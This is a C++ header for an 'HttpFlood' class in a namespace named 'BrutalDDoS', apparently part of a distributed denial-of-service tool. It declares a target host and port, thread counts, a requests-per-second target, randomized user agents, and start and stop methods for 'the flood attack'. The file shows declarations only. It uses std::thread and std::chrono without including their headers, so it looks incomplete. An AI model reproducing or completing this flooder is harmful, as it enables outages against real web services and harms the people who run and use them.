#ifndef HTTP_FLOOD_H
#define HTTP_FLOOD_H

#include <string>
#include <vector>
#include <atomic>
#include <mutex>
#include <functional>

// Forward declarations from other modules to avoid circular dependencies
namespace BrutalDDoS {
    namespace Core {
        class AttackEngine;
    }
    namespace Network {
        class SocketManager;
    }
}

class HttpFlood {
public:
    struct Config {
        std::string host;       // Target Host header
        std::string path;       // Target URI path (default /)
        int port;               // Target port (usually 80 or 443)
        int threads;            // Number of concurrent connections
        int rps_target;         // Requests Per Second target (aggregate)
        bool use_post;          // If true, send POST, else GET
        std::string content_type; // Default: application/x-www-form-urlencoded
        size_t payload_size;    // Size of body for POST
        std::string user_agent; // Randomized UA if empty
        
        // Optional headers to append
        std::vector<std::pair<std::string, std::string>> extra_headers;
    };

    HttpFlood(const Config& config);
    ~HttpFlood();

    // Start the flood attack
    void start();

    // Stop the flood attack gracefully
    void stop();

    // Get statistics
    struct Stats {
        uint64_t total_requests = 0;
        uint64_t bytes_sent = 0;
        uint64_t errors = 0;
        double current_rps = 0.0;
    };

    Stats getStats() const;

private:
    // Worker thread function
    void workerThread(int threadId);

    // Generate a realistic HTTP request string
    std::string generateRequest(int requestId);

    // Send a single request via a socket
    bool sendRequest(int sockFd, const std::string& request);

    // Parse the URL/path from config if needed
    void parsePath();

    // Configuration
    Config m_config;
    
    // Control flags
    std::atomic<bool> m_running;
    std::atomic<bool> m_stopping;

    // Threading
    std::vector<std::thread> m_workers;
    std::mutex m_statsMutex;
    Stats m_stats;

    // Timing control
    std::chrono::steady_clock::time_point m_startTime;
};

#endif // HTTP_FLOOD_H
